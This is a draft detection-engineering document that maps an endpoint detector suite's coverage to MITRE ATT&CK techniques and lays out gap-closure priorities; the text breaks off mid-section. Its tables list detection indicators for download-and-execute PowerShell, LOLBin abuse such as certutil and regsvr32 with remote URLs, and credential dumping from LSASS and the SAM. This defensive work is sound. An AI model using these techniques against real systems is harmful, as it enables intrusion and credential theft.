---
title: "02 -- MITRE ATT&CK Coverage Analysis"
series: Swarm Hardening (2 of 8)
version: "0.3"
date: 2026-04-08
status: Draft
authors: Swarm Team Six Research
---

# 02 -- MITRE ATT&CK Coverage Analysis

> **Scope**: Systematic mapping of the swarm-whisker detection strategies to the
> MITRE ATT&CK framework (Enterprise v15), identification of high-priority
> coverage gaps, and a prioritized roadmap for closing those gaps in
> upcoming releases.

> **Series Note**
> - This is the second document in the Swarm Hardening series.
> - All technique IDs reference MITRE ATT&CK Enterprise (version 15).
> - Coverage assessments are grounded in the actual detection logic implemented
>   in `crates/swarm-whisker/src/`, not aspirational designs.
> - Where a technique ID appears explicitly in the code (via `mitre_technique_id`
>   evidence fields), this is noted as a code-confirmed mapping. Other mappings
>   are analytical based on the heuristics implemented.
> - Series-wide status and reading order are maintained in
>   [00-OVERVIEW.md](00-OVERVIEW.md).

---

## Table of Contents

1. [Abstract](#1-abstract)
2. [Methodology](#2-methodology)
3. [Current Coverage Matrix](#3-current-coverage-matrix)
4. [Tactic-Level Summary](#4-tactic-level-summary)
5. [High-Priority Gaps](#5-high-priority-gaps)
6. [Structural Detectability Gaps](#6-structural-detectability-gaps)
7. [ThreatClass Variants With Zero Detector Coverage](#7-threatclass-variants-with-zero-detector-coverage)
8. [Detector Deconfliction](#8-detector-deconfliction)
9. [Gap Prioritization Framework](#9-gap-prioritization-framework)
10. [Detector Roadmap](#10-detector-roadmap)
11. [Coverage Improvement Targets](#11-coverage-improvement-targets)
12. [Telemetry Requirements](#12-telemetry-requirements)
13. [Open Questions and Future Work](#13-open-questions-and-future-work)
- [Cross-References](#cross-references)
- [References](#references)

---

## 1. Abstract

ClawdStrike Ambush currently ships eight detection strategy modules in the
`swarm-whisker` crate: `SuspiciousProcessTreeDetector`, `SuspiciousScriptingDetector`,
`CredentialAccessDetector`, `DnsExfiltrationDetector`, `LateralMovementDetector`,
`PersistenceDetector`, `SupplyChainDetector`, and `NetworkConnectDetector`, unified
by a `CompositeDetector` that dispatches a single telemetry event to all active
strategies.

This document performs a technique-level analysis of those detectors against the
MITRE ATT&CK Enterprise matrix. We find that the current engine provides Full or
Partial coverage for approximately 35 ATT&CK technique and sub-technique IDs
across 8 of the 14 tactics, with the strongest depth in Execution, Credential
Access, Lateral Movement, and Persistence. Some techniques span multiple tactics
(e.g., T1574.001 appears under both Persistence and Defense Evasion), so the
tactic-level totals in Section 4 sum higher than the unique technique count.
Significant gaps exist in Initial Access, Privilege Escalation, Discovery,
Collection, and Impact -- tactics that require telemetry sources and detection
heuristics not yet implemented.

We propose a prioritized gap-closure roadmap scored by a three-axis model
(prevalence in real-world campaigns, impact if undetected, and detection
feasibility given the current telemetry surface). The top four recommended new
detectors -- Masquerading, Defense Impairment, Ingress Tool Transfer, and
Discovery Enumeration -- can be built entirely on existing telemetry and would
expand coverage to approximately 45 technique IDs and address 7 of the top 10
most prevalent techniques reported in Red Canary's 2025 Threat Detection Report.

---

## 2. Methodology

### 2.1 Assessment Scope

The analysis covers:
- All Rust source files in `crates/swarm-whisker/src/` (8 detector modules plus
  the composite dispatcher and stream runtime).
- The `ThreatClass` taxonomy defined in `crates/swarm-core/src/pheromone.rs`.
- The `TelemetryPayload` variants defined in `crates/swarm-core/src/telemetry.rs`
  (re-exported via `crates/swarm-whisker/src/detector.rs`).
- The `Severity` enum and `ResponseAction` types in `crates/swarm-core/src/types.rs`.

### 2.2 Coverage Levels

Each technique is assessed at one of three levels:

| Level | Definition |
|-------|-----------|
| **Full** | The detector implements heuristics that directly target this technique, with code-confirmed MITRE IDs in evidence payloads or test cases that exercise the specific attack pattern. |
| **Partial** | The detector's heuristics would catch some variants of this technique as a side effect, but the technique is not the primary detection target and significant sub-techniques are missed. |
| **None** | No existing detector implements heuristics that would reliably detect this technique. |

### 2.3 Mapping Procedure

For each detector module, we:

1. Identified the `ThreatClass` variant emitted (from `DetectionFinding.threat_class`).
2. Extracted explicit MITRE technique IDs from evidence JSON fields (e.g.,
   `"mitre_technique_id": "T1547.001"` in `persistence.rs`).
3. Analyzed the heuristic logic (indicator lists, pattern matching, statistical
   thresholds) to determine which ATT&CK techniques the logic would catch.
4. Cross-referenced against the MITRE ATT&CK Enterprise v15 technique catalog.
5. Validated against the test suites to confirm which attack patterns are exercised.

### 2.4 ThreatClass to Tactic Mapping

The `ThreatClass` enum in `pheromone.rs` maps to ATT&CK tactics as follows:

| ThreatClass Variant | Primary ATT&CK Tactic(s) |
|---------------------|--------------------------|
| `Execution` | Execution (TA0002) |
| `CredentialAccess` | Credential Access (TA0006) |
| `DataExfiltration` | Exfiltration (TA0010) |
| `LateralMovement` | Lateral Movement (TA0008) |
| `Persistence` | Persistence (TA0003) |
| `SupplyChain` | Defense Evasion (TA0005), Initial Access (TA0001) |
| `CommandAndControl` | Command and Control (TA0011) |
| `PrivilegeEscalation` | Privilege Escalation (TA0004) |
| `InitialAccess` | Initial Access (TA0001) |
| `DefenseEvasion` | Defense Evasion (TA0005) |
| `Discovery` | Discovery (TA0007) |
| `Impact` | Impact (TA0040) |
| `Custom(String)` | Analyst-defined |

---

## 3. Current Coverage Matrix

### 3.1 SuspiciousProcessTreeDetector (`detector.rs`)

Detects suspicious parent-child process relationships (e.g., Office applications
spawning shells). Emits `ThreatClass::Execution`.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| Command and Scripting Interpreter | T1059 | Partial | Detects suspicious child process spawns (`powershell`, `pwsh`, `cmd`, `sh`, `bash`, `curl`, `wget`) from Office-family parents (`winword`, `excel`, `outlook`, `acrord32`, `teams`). Does not distinguish sub-techniques beyond parent-child pair. The `curl`/`wget` children also provide incidental coverage of T1105 (Ingress Tool Transfer). |
| Command and Scripting Interpreter: PowerShell | T1059.001 | Partial | Triggers when `powershell`/`pwsh` is a suspicious child; checks for `-enc`, `base64`, `downloadstring` in command line. |
| User Execution: Malicious File | T1204.002 | Partial | Implicitly covered when Office spawns a shell (user opened a weaponized document). |
| Phishing: Spearphishing Attachment | T1566.001 | Partial | Side-effect detection: the Office-to-shell chain often originates from a phishing attachment. |

### 3.2 SuspiciousScriptingDetector (`suspicious_scripting.rs`)

Detects encoded PowerShell, download-and-execute chains, and LOLBin abuse.
Emits `ThreatClass::Execution`.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| Command and Scripting Interpreter: PowerShell | T1059.001 | Full | Detects `-enc`, `-encodedcommand`, `frombase64string`, `base64` indicators; download-execute via `downloadstring`, `downloadfile`, `new-object net.webclient`, `invoke-webrequest`, `iwr` combined with execution verbs (`iex`, `invoke-expression`, `start-process`, `cmd /c`). |
| Command and Scripting Interpreter: Visual Basic | T1059.005 | Partial | `wscript`/`cscript` LOLBin detection covers VBS execution with remote URLs or `.vbs` extensions. |
| Command and Scripting Interpreter: JavaScript | T1059.007 | Partial | `wscript`/`cscript` LOLBin detection covers `.js` extension matching and remote URL patterns. |
| Signed Binary Proxy Execution: Mshta | T1218.005 | Full | Explicit `mshta` LOLBin with remote URL detection. |
| Signed Binary Proxy Execution: Regsvr32 | T1218.010 | Full | Explicit `regsvr32` with `/i:http` pattern. |
| Signed Binary Proxy Execution: Rundll32 | T1218.011 | Full | Explicit `rundll32` with `javascript:` or remote URL patterns. |
| Signed Binary Proxy Execution: CMSTP | T1218.003 | Full | Explicit `cmstp` with `/s` and `.inf` pattern. |
| System Binary Proxy Execution: Certutil | T1140 / T1105 | Partial | `certutil -urlcache` and `certutil -verifyctl` with HTTP URLs detected as LOLBin abuse. Overlaps with T1105 (Ingress Tool Transfer) and T1140 (Deobfuscate/Decode). |
| Obfuscated Files or Information | T1027 | Partial | Base64/encoded command detection catches the most common obfuscation vector but misses file-level packing, steganography, and other encoding schemes. |

### 3.3 CredentialAccessDetector (`credential_access.rs`)

Detects LSASS memory access, SAM registry reads, and Kerberoasting patterns.
Emits `ThreatClass::CredentialAccess`.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| OS Credential Dumping: LSASS Memory | T1003.001 | Full | Detects via `RegistryAccess` events where `target_process` matches `lsass.exe`/`lsass` (the protected-processes list). Critical severity, high confidence. Note: this relies on the telemetry source populating the `target_process` field on process-access events routed through the registry access pathway. |
| OS Credential Dumping: Security Account Manager | T1003.002 | Full | Registry read access to `HKLM\SAM` detected. |
| OS Credential Dumping: LSA Secrets | T1003.004 | Full | Registry read access to `HKLM\SECURITY` and `HKLM\SYSTEM\CurrentControlSet\Control\LSA` detected. |
| Steal or Forge Kerberos Tickets: Kerberoasting | T1558.003 | Full | `kerberos_tgs` authentication events from suspicious processes (`powershell`, `pwsh`, `rubeus`, `mimikatz`, `kekeo`, `cmd`, `python`, `python3`, `impacket`) detected. Process names are normalized (path-stripped, extension-stripped, lowercased) before matching. |
| OS Credential Dumping: DCSync | T1003.006 | None | Requires detecting DRS replication requests; not implemented. |
| OS Credential Dumping: /etc/passwd and /etc/shadow | T1003.008 | None | No Linux credential file access detection. |
| Unsecured Credentials | T1552 | None | No detection of credentials in files, registry, or environment variables. |

### 3.4 DnsExfiltrationDetector (`dns_exfiltration.rs`)

Detects DNS tunneling, high-entropy subdomains, known tunneling tool patterns,
and query burst volume. Emits `ThreatClass::DataExfiltration`.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| Exfiltration Over Alternative Protocol: DNS | T1048.003 | Full | Shannon entropy analysis, known tunneling patterns (`dnscat`, `iodine`), suspicious query types (TXT, NULL, CNAME), burst detection, and subdomain length analysis. |
| Application Layer Protocol: DNS | T1071.004 | Partial | DNS-based C2 channels would trigger the same entropy/pattern heuristics, but classified as `DataExfiltration` rather than `CommandAndControl`. |
| Data Encoding: Standard Encoding | T1132.001 | Partial | High-entropy subdomain detection implicitly catches base64-encoded exfiltration payloads in DNS labels. |

### 3.5 LateralMovementDetector (`lateral_movement.rs`)

Detects WMI remote execution, PsExec, WinRS, SMBExec, PowerShell remoting,
CIM remoting, unusual SSH, and RDP brute-forcing. Emits `ThreatClass::LateralMovement`.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| Remote Services: SMB/Windows Admin Shares | T1021.002 | Full | `psexec` and `smbexec` indicator matching. |
| Remote Services: SSH | T1021.004 | Full | Unusual SSH source detection with allowlist support. |
| Remote Services: RDP | T1021.001 | Partial | Failed RDP brute-force detection via rolling window threshold (default 3 failures in 5 minutes). Does not detect successful lateral movement via RDP after initial access. |
| Windows Management Instrumentation | T1047 | Full | `wmic /node: process call create` pattern matched explicitly. Also covers CIM remoting via `invoke-cimmethod -computername` / `-cimsession` patterns. |
| Remote Services: Windows Remote Management | T1021.006 | Full | `winrs`, `invoke-command -computername`, `new-pssession`, `enter-pssession` all detected. |
| Remote Services: Distributed Component Object Model | T1021.003 | None | DCOM remote execution not covered. |
| Lateral Tool Transfer | T1570 | None | No detection of file copy operations between hosts. |

### 3.6 PersistenceDetector (`persistence.rs`)

Detects registry Run key modifications, scheduled tasks, cron jobs, and systemd
timers. Emits `ThreatClass::Persistence`. Contains **code-confirmed MITRE IDs**.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder | T1547.001 | Partial | **Code-confirmed** (`"mitre_technique_id": "T1547.001"`). Monitors HKLM/HKCU Run and RunOnce keys for write operations with executable value detection. Does NOT monitor the Startup folder (`shell:startup`), so only the registry-key half of T1547.001 is covered. |
| Scheduled Task/Job: Scheduled Task | T1053.005 | Full | **Code-confirmed** (`"mitre_technique_id": "T1053.005"`). Detects writes to `system32/tasks/`, `.job`/`.xml` files, and `schtasks`/`<task` content patterns. |
| Scheduled Task/Job: Cron | T1053.003 | Full | **Code-confirmed** (`"mitre_technique_id": "T1053.003"`). Monitors `/etc/cron`, `/etc/cron.d`, `/var/spool/cron` for write operations. High-signal patterns include `* * *`, `@reboot`, `/bin/`, `/usr/bin/`. |
| Scheduled Task/Job: Systemd Timers | T1053.006 | Full | **Code-confirmed** (`"mitre_technique_id": "T1053.006"`). Monitors `/etc/systemd/system`, `/usr/lib/systemd/system`, `.timer` files, `[Timer]`/`OnCalendar=` content. |
| Event Triggered Execution: WMI Subscriptions | T1546.003 | None | No WMI event subscription detection. |
| Create or Modify System Process: Windows Service | T1543.003 | None | No service creation/modification detection. |
| Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 | Partial | Covered by `SupplyChainDetector`, not by `PersistenceDetector` directly. |

### 3.7 SupplyChainDetector (`supply_chain.rs`)

Detects unsigned binaries in trusted paths, signed binary proxy execution abuse
(certutil, rundll32), and DLL sideloading. Emits `ThreatClass::SupplyChain`.
Contains **code-confirmed MITRE IDs**.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| Subvert Trust Controls: Code Signing | T1553.002 | Full | **Code-confirmed** (`"mitre_technique_id": "T1553.002"`). Detects binaries in trusted paths with invalid signatures from untrusted signers. |
| Signed Binary Proxy Execution | T1218 | Full | **Code-confirmed** (`"mitre_technique_id": "T1218"`). Certutil `-urlcache` with remote URLs. Note: the code emits the parent technique T1218 rather than the more precise sub-technique T1218.009 (System Binary Proxy Execution: Certutil); this should be refined. |
| Signed Binary Proxy Execution: Rundll32 | T1218.011 | Full | **Code-confirmed** (`"mitre_technique_id": "T1218.011"`). Rundll32 with `javascript:` or remote URLs. |
| Hijack Execution Flow: DLL Search Order Hijacking | T1574.001 | Full | **Code-confirmed** (`"mitre_technique_id": "T1574.001"`). Library load/write from unexpected directories for known loader-library pairs (rundll32, svchost, python). |
| Supply Chain Compromise | T1195 | Partial | The unsigned-binary-in-trusted-path heuristic catches post-compromise artifacts of supply chain attacks but does not detect the compromise vector itself. |

### 3.8 NetworkConnectDetector (`network_connect.rs`)

Detects C2 beaconing (low-jitter periodic connections), suspicious ports, and
process-port policy violations. Emits `ThreatClass::CommandAndControl`.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| Application Layer Protocol | T1071 | Partial | Process-port mismatch detects processes using unexpected ports (e.g., Chrome on 8080), which may indicate protocol abuse. Does not inspect protocol content. |
| Non-Standard Port | T1571 | Full | Suspicious ports list (4444, 5555, 6667, 31337) with configurable additions. |
| Data Encoding | T1132 | None | No payload inspection; beaconing is detected via timing, not content. |
| Proxy | T1090 | None | No proxy chain detection. |
| Remote Access Software | T1219 | Partial | Would trigger on suspicious-port or beaconing heuristics if the remote access tool produces detectable patterns. No signature-based detection. |
| Encrypted Channel | T1573 | None | No TLS/encryption analysis. |

### 3.9 CompositeDetector (`composite.rs`)

Multi-strategy dispatcher that evaluates all registered strategies against each
event. Does not implement its own detection logic. Its value is in enabling
cross-strategy correlation at the pheromone substrate level.

| ATT&CK Technique | ID | Coverage | Notes |
|-------------------|----|----------|-------|
| N/A | N/A | N/A | Aggregation only. Coverage is the union of all registered strategies. |

---

## 4. Tactic-Level Summary

The following table summarizes coverage by ATT&CK tactic. "Techniques Covered"
counts techniques with Full or Partial coverage. "Total Relevant Techniques"
is the count of techniques in the Enterprise matrix for that tactic that are
applicable to endpoint/network telemetry (excluding cloud-only, mobile-only, and
ICS-only techniques). Percentages are approximate.

| Tactic | ID | Techniques Covered (Full + Partial) | Estimated Total Relevant | Coverage % | Primary Detector(s) |
|--------|----|-------------------------------------|--------------------------|------------|---------------------|
| Initial Access | TA0001 | 2 (0 Full + 2 Partial) | 9 | ~22% | SuspiciousProcessTree (phishing side-effect), SupplyChain (partial) |
| Execution | TA0002 | 6 (2 Full + 4 Partial) | 12 | ~50% | SuspiciousScripting, SuspiciousProcessTree |
| Persistence | TA0003 | 5 (3 Full + 2 Partial) | 19 | ~26% | Persistence, SupplyChain (DLL hijack) |
| Privilege Escalation | TA0004 | 1 (0 Full + 1 Partial) | 13 | ~8% | SupplyChain (DLL hijack as escalation vector) |
| Defense Evasion | TA0005 | 8 (5 Full + 3 Partial) | 42 | ~19% | SuspiciousScripting (LOLBins), SupplyChain (code signing, signed binary proxy) |
| Credential Access | TA0006 | 4 (4 Full + 0 Partial) | 16 | ~25% | CredentialAccess |
| Discovery | TA0007 | 0 | 29 | 0% | None |
| Lateral Movement | TA0008 | 5 (4 Full + 1 Partial) | 9 | ~56% | LateralMovement |
| Collection | TA0009 | 0 | 17 | 0% | None |
| Command and Control | TA0011 | 3 (1 Full + 2 Partial) | 16 | ~19% | NetworkConnect, DnsExfiltration (partial C2-over-DNS) |
| Exfiltration | TA0010 | 2 (1 Full + 1 Partial) | 9 | ~22% | DnsExfiltration |
| Impact | TA0040 | 0 | 13 | 0% | None |
| Resource Development | TA0042 | 0 | 8 | 0% | Out of scope (pre-intrusion) |
| Reconnaissance | TA0043 | 0 | 10 | 0% | Out of scope (pre-intrusion) |

### 4.1 Strengths

- **Lateral Movement (56%)**: Highest coverage among endpoint-relevant tactics.
  The detector covers the most common remote execution tools (PsExec, WMI,
  PowerShell remoting, SSH, RDP) with both process-based and authentication-based
  detection.
- **Execution (50%)**: Strong PowerShell and LOLBin coverage, including
  sub-technique-level detection for encoded commands, download-execute chains,
  six specific signed binary proxy execution methods, and partial JavaScript
  detection via wscript/cscript LOLBin handling.
- **Credential Access (25%)**: Focused but deep. All four covered techniques have
  Full coverage with well-tested heuristics. LSASS, SAM, LSA Secrets, and
  Kerberoasting represent the most common credential theft vectors.
- **Persistence (26%)**: Code-confirmed MITRE IDs demonstrate intentional mapping.
  Three techniques with Full coverage (scheduled tasks, cron, systemd timers)
  across Windows and Linux, plus Partial coverage for registry Run keys
  (T1547.001 -- startup folder monitoring absent) and DLL hijacking.

### 4.2 Weaknesses

- **Discovery (0%)**: No detectors for network scanning, account enumeration,
  system information discovery, or permission group enumeration. This is a major
  gap because Discovery activity is present in virtually every intrusion.
- **Collection (0%)**: No detectors for screen capture, keylogging, clipboard
  collection, data staging, or archive creation.
- **Impact (0%)**: No detectors for data destruction, ransomware encryption,
  service stop, or resource hijacking.
- **Privilege Escalation (8%)**: Only incidental coverage through DLL hijacking.
  No detection for process injection, token manipulation, UAC bypass, or
  exploitation of privilege escalation vulnerabilities.

---

## 5. High-Priority Gaps

The following techniques are NOT covered (or only minimally covered) but appear
consistently in top real-world campaign analyses (MITRE ATT&CK top techniques,
Red Canary 2024-2025 Threat Detection Reports, CISA advisories).

### 5.1 T1055 -- Process Injection

**Prevalence**: Top 5 in Red Canary 2025; used by 65%+ of tracked intrusion sets.
**Current coverage**: None.
**Why it matters**: Process injection (DLL injection, process hollowing, APC
injection, thread execution hijacking) is the primary method adversaries use to
execute code in the context of legitimate processes, evading both signature-based
and parent-child heuristics. Our `SuspiciousProcessTreeDetector` is specifically
blind to this technique because the malicious code runs inside an already-trusted
process.

**Required telemetry**: `CreateRemoteThread`, `NtMapViewOfSection`,
`QueueUserAPC`, `WriteProcessMemory` syscall events. These would require a new
`TelemetryPayload` variant (e.g., `MemoryOperation` or `ProcessInjection`).

**Detection approaches**:
- Cross-process memory write detection (source PID writes to target PID memory).
- Known injection API call sequences (e.g., `VirtualAllocEx` + `WriteProcessMemory`
  + `CreateRemoteThread`).
- Module load from unusual paths in the context of injected processes.

### 5.2 T1027 -- Obfuscated Files or Information

**Prevalence**: Top 3 in Red Canary 2025; nearly universal in malware delivery.
**Current coverage**: Partial (base64/encoded PowerShell commands only).
**Gap**: The `SuspiciousScriptingDetector` catches `-enc` and `frombase64string`
indicators in PowerShell command lines. This misses:
- T1027.001: Binary Padding
- T1027.002: Software Packing (UPX, Themida, custom packers)
- T1027.004: Compile After Delivery
- T1027.005: Indicator Removal from Tools
- T1027.006: HTML Smuggling
- T1027.009: Embedded Payloads
- T1027.010: Command Obfuscation (string concatenation, environment variable
  substitution, caret insertion in cmd.exe)
- T1027.011: Fileless Storage (registry, WMI)

**Detection approaches**:
- Entropy analysis of executable files (high entropy suggests packing).
- Known packer signature detection in PE headers.
- Command-line deobfuscation engine for cmd.exe caret/variable tricks.
- Script block logging analysis for PowerShell (post-deobfuscation content).

### 5.3 T1562 -- Impair Defenses

**Prevalence**: Top 10 in Red Canary 2025; attackers routinely disable security
tools as an early post-compromise action.
**Current coverage**: None.
**Sub-techniques of concern**:
- T1562.001: Disable or Modify Tools (killing AV processes, unloading EDR drivers).
- T1562.002: Disable Windows Event Logging.
- T1562.004: Disable or Modify System Firewall.
- T1562.006: Indicator Blocking (ETW patching).
- T1562.009: Safe Mode Boot (bypass security software).

**Required telemetry**: Service stop events, driver unload events, registry
modifications to security-related keys, ETW provider status changes.

**Detection approaches**:
- Monitor for process termination of known security products.
- Registry write detection for `DisableAntiSpyware`, `DisableRealtimeMonitoring`,
  and similar keys under `HKLM\SOFTWARE\Microsoft\Windows Defender`.
- Service control manager events for security service state changes.
- Audit log gap detection (absence of expected log volume as a signal).

### 5.4 T1036 -- Masquerading

**Prevalence**: Top 5 in Red Canary 2025; fundamental evasion technique.
**Current coverage**: None.
**Why it matters**: Masquerading directly undermines the `SuspiciousProcessTreeDetector`
and `SuspiciousScriptingDetector`, both of which rely on process name matching.
An adversary renaming `mimikatz.exe` to `svchost.exe` would bypass current
detection entirely.

**Sub-techniques of concern**:
- T1036.001: Invalid Code Signature.
- T1036.003: Rename System Utilities.
- T1036.004: Masquerade Task or Service.
- T1036.005: Match Legitimate Name or Location.
- T1036.007: Double File Extension.

**Detection approaches**:
- Process name vs. executable path mismatch (e.g., `svchost.exe` running from
  `C:\Users\Public\` instead of `C:\Windows\System32\`).
- PE metadata validation (internal name vs. file name discrepancy).
- The `SupplyChainDetector` already has the `trusted_paths` concept; extending
  this to validate process names against expected paths would catch T1036.005.

### 5.5 T1071 -- Application Layer Protocol

**Prevalence**: Top 10; nearly every C2 framework uses HTTP/HTTPS (T1071.001)
or DNS (T1071.004) for communications.
**Current coverage**: Partial.
- T1071.004 (DNS) is partially covered by `DnsExfiltrationDetector`, though
  classified as exfiltration rather than C2.
- T1071.001 (Web Protocols) has no dedicated detection. The `NetworkConnectDetector`
  catches beaconing timing patterns but does not inspect HTTP traffic.
- T1071.002 (File Transfer Protocols) and T1071.003 (Mail Protocols) are not
  covered.

**Detection approaches**:
- HTTP/S header anomaly detection (unusual User-Agent strings, abnormal header
  ordering, JA3/JA3S fingerprint analysis).
- URI pattern analysis (C2 frameworks produce distinctive URL structures).
- Payload size distribution analysis (C2 check-ins tend to have consistent
  request/response sizes).
- DNS query classification should emit both `DataExfiltration` and
  `CommandAndControl` threat classes when DNS tunneling is detected.

### 5.6 T1105 -- Ingress Tool Transfer

**Prevalence**: Top 10; adversaries must deliver tools to compromised hosts.
**Current coverage**: Partial (certutil URL download detected as LOLBin abuse
in both `SuspiciousScriptingDetector` and `SupplyChainDetector`).
**Gap**: Does not detect tool transfer via:
- `bitsadmin` (T1197)
- `curl`/`wget` invocations with suspicious destinations
- PowerShell `Invoke-WebRequest` to non-allowlisted domains (partially
  covered in scripting detector but not correlated with downloaded file
  execution)
- Browser-based downloads followed by execution from Downloads/Temp directories

**Detection approaches**:
- Download-then-execute pattern correlation (file download event followed by
  process start from the same path within a time window).
- Monitoring for common transfer tool invocations with external destinations.
- File creation in Temp/Downloads directories with subsequent execution.

### 5.7 T1059.001 -- PowerShell (Depth Analysis)

**Current coverage**: Strong but not complete.
**What is covered**:
- Encoded command execution (`-enc`, `-encodedcommand`, `frombase64string`, `base64`).
- Download-execute chains (`downloadstring`, `downloadfile`, `invoke-webrequest`,
  `iwr` combined with `iex`, `invoke-expression`, `start-process`, `cmd /c`).
- PowerShell as suspicious child process (from Office parents).
- PowerShell as Kerberoasting tool.
- PowerShell remoting for lateral movement.

**What is NOT covered**:
- PowerShell AMSI bypass techniques (`[Ref].Assembly` manipulation).
- PowerShell Constrained Language Mode bypass.
- PowerShell script block content analysis (requires script block log telemetry).
- `Add-Type` for inline C# compilation (T1027.004 overlap).
- PowerShell module side-loading.
- PowerShell profile persistence (T1546.013).

### 5.8 T1003 -- OS Credential Dumping (Sub-technique Depth)

**Current coverage**: Strong for Windows, absent for Linux/macOS.
**What is covered**:
- T1003.001: LSASS Memory (Full).
- T1003.002: SAM (Full).
- T1003.004: LSA Secrets (Full).
- T1003 via Kerberoasting correlation (T1558.003, Full).

**What is NOT covered**:
- T1003.003: NTDS (Active Directory database extraction).
- T1003.005: Cached Domain Credentials.
- T1003.006: DCSync (DRS replication protocol abuse).
- T1003.007: Proc Filesystem (`/proc/pid/maps` for credential extraction on Linux).
- T1003.008: `/etc/passwd` and `/etc/shadow` access on Linux.

---

## 6. Structural Detectability Gaps

> **Added in v0.3** to document technique families that are structurally
> impossible to detect given the current `TelemetryPayload` enum, regardless
> of detector logic improvements.

### 6.1 TelemetryPayload Limitations

The `TelemetryPayload` enum in `crates/swarm-core/src/telemetry.rs` defines
7 payload variants. The following ATT&CK technique families require telemetry
categories that have no corresponding variant, making them **architecturally
undetectable** without schema expansion:

| Missing Telemetry Category | Techniques Blocked | ATT&CK IDs | Required Data |
|---------------------------|-------------------|-------------|---------------|
| **MemoryOperation** | Process injection (all sub-techniques), process hollowing, reflective code loading, .NET assembly loading | T1055.001, T1055.002, T1055.003, T1055.012, T1055.013, T1620, T1620.001 | Source PID, target PID, operation type (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `NtMapViewOfSection`, `QueueUserAPC`), memory region address, size |
| **ImageLoad / ModuleLoad** | DLL sideloading at runtime (vs. file write time), DLL search-order hijacking during load, reflective DLL injection detection | T1574.001 (runtime), T1574.002, T1574.008, T1620 | Process PID, loaded image path, image hash, signer, whether loaded from disk or memory |
| **InstrumentationTamper** | AMSI bypass, ETW patching, kernel callback removal, security tool disabling via API | T1562.001 (API-level), T1562.006 | Target API/provider, tamper method (patch, unhook, null), process performing the tamper |
| **DriverLoad** | Rootkit deployment, vulnerable driver exploitation (BYOVD) | T1014, T1068 | Driver path, driver signer, driver hash, load method |
| **ServiceChange** | Service creation for persistence, service stop for impact, security service tampering | T1543.003, T1489, T1569.002 | Service name, operation (create/start/stop/delete), binary path, account |
| **WmiEvent** | WMI event subscription persistence, WMI-based execution | T1546.003, T1047 (subscription-based) | Subscription type (EventFilter/Consumer/Binding), WQL query, consumer command |

### 6.2 Quantified Coverage Impact

Adding the top-3 missing telemetry variants would unlock detection for:

| Phase | Telemetry Additions | New Technique IDs Detectable | Cumulative Unique Techniques |
|-------|--------------------|-----------------------------|------------------------------|
| Current | None | 0 | ~35 |
| Phase 1 | `ImageLoad`, `MemoryOperation`, `ServiceChange` | T1055.* (5), T1620 (2), T1574.* runtime (3), T1543.003, T1489, T1569.002 | ~48 |
| Phase 2 | + `InstrumentationTamper`, `WmiEvent` | T1562.001/006, T1546.003, T1047-subscription | ~53 |
| Phase 3 | + `DriverLoad` | T1014, T1068 | ~55 |

This represents a 57% increase in unique technique coverage from the current
baseline, achievable entirely through telemetry schema expansion and
corresponding detector implementation.

### 6.3 DNS Entropy Threshold Validation Gap

The `DnsExfiltrationDetector` uses a Shannon entropy threshold of 3.5 bits as
the primary heuristic for identifying data-encoding in DNS subdomains. This
threshold has **no documented empirical validation** against legitimate traffic
distributions.

**Why 3.5 is problematic:**

Legitimate cloud service subdomains frequently exceed 3.5 bits of entropy:

| Service | Example Subdomain | Approx. Entropy |
|---------|-------------------|-----------------|
| AWS CloudFront | `d1a2b3c4e5f6g7.cloudfront.net` | 3.7 - 4.0 |
| Azure Blob Storage | `a1b2c3d4e5f6.blob.core.windows.net` | 3.6 - 3.9 |
| Google Cloud CDN | `storage-xyz123abc.googleapis.com` | 3.5 - 3.8 |
| Akamai CDN | `e1234.dscg.akamaiedge.net` | 3.4 - 3.7 |
| npm/Yarn package mirrors | `registry.npmjs.org` with hash subdomains | 3.8 - 4.2 |

Without a validated false-positive rate against production DNS traffic, the
3.5 threshold may generate unacceptable alert noise in environments with heavy
CDN usage, leading operators to raise the threshold or disable the detector --
both of which weaken detection of actual DNS exfiltration.

**Recommended validation approach:** Collect 24 hours of DNS query logs from a
representative environment, compute subdomain entropy for each query, and plot
the ROC curve for entropy-based exfiltration detection at thresholds from 2.5
to 5.0 in 0.1 increments. The optimal threshold is the point that maximizes
`sensitivity - (1 - specificity)` weighted by the operational cost of false
positives.

---

## 7. ThreatClass Variants With Zero Detector Coverage

> **Added in v0.3** to explicitly document `ThreatClass` enum variants that
> are defined in `swarm-core` but have no producing detector in `swarm-whisker`.

### 7.1 Dead-Code ThreatClass Variants

The `ThreatClass` enum in `crates/swarm-core/src/pheromone.rs` defines 12
named variants. Of these, **5 have zero detector coverage** -- no
`DetectionStrategy` implementation in `swarm-whisker` ever produces a
`DetectionFinding` with these threat classes:

| ThreatClass Variant | ATT&CK Tactic | Detectors Producing It | Status |
|--------------------|---------------|------------------------|--------|
| `PrivilegeEscalation` | Privilege Escalation (TA0004) | None | Dead code -- variant is declared, serializable, and can be deposited as a pheromone, but no detection logic ever emits it |
| `Discovery` | Discovery (TA0007) | None | Dead code |
| `Impact` | Impact (TA0040) | None | Dead code |
| `InitialAccess` | Initial Access (TA0001) | None | Dead code |
| `DefenseEvasion` | Defense Evasion (TA0005) | None | Dead code -- despite the `SupplyChainDetector` covering techniques that ATT&CK classifies under Defense Evasion (T1218, T1553.002), it emits `ThreatClass::SupplyChain` instead |

### 7.2 Implications

These variants create a misleading API surface. Downstream consumers
(pheromone substrate escalation, response policy gates, UI dashboards) may
implement logic branches for these threat classes that can never be triggered
by actual detection events. This is particularly concerning for:

- **Escalation thresholds:** `ThreatClassConfig` overrides can be configured
  for `PrivilegeEscalation` or `Impact`, but no pheromone deposits with those
  classes will ever be produced to test the escalation logic.
- **Response policies:** `ResponseAction` decisions that key on `ThreatClass`
  may have untested branches for these variants.
- **Coverage reporting:** Automated coverage metrics that count `ThreatClass`
